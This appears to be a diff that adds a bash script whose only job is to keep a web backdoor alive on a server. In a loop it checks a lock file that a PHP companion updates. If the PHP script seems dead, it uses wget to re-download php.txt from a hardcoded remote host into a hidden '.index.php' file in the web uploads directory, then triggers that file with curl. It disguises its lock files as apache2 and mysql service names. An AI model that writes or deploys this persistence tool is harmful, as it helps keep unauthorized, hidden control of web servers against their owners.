@@ -1,0 +1,45 @@
+#!/bin/bash
+
+#>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+# Must Config
+php_url="http://192.168.187.128/php.txt"
+port=80
+web_root="/var/www/html"
+writable_path="/uploads";
+#<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+# Config
+bash_lock_file="/tmp/8960fee17b-apache2.service-lw2D8m"
+php_lock_file="/tmp/82aa24546d-mysql.service-hcl342"
+php_filename="/.index.php";
+#<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+sleep_time=3
+
+target_path=${web_root}${writable_path}${php_filename}
+start_url="http://127.0.0.1:${port}${writable_path}${php_filename}"
+time_out=0.5
+
+echo "Initing..."
+echo "Target path : ${target_path}"
+echo "Start url : ${start_url}"
+
+while [[ : ]]; do
+    # tell php that i am living
+    echo "Creating lock file..."
+    touch -a ${bash_lock_file}
+    # check php is living or not
+    last_access_time=`stat -c %X ${php_lock_file}`
+    now_time=`date +%s`
+    echo "php last alive time : ${last_access_time}"
+    echo $[ $now_time - $last_access_time ];
+    if [ ! -f "${php_lock_file}" ] || [ $[ $now_time - $last_access_time ] -gt $((sleep_time+1)) ]; then
+        echo "[-] php script is dead!"
+        echo "downloading php script"
+        wget ${php_url} -O $target_path && curl ${start_url} -m ${time_out}
+    else
+        echo "PHP script is alive..."
+    fi
+    # sleeping
+    echo "sleeping..."
+    sleep ${sleep_time}
+done
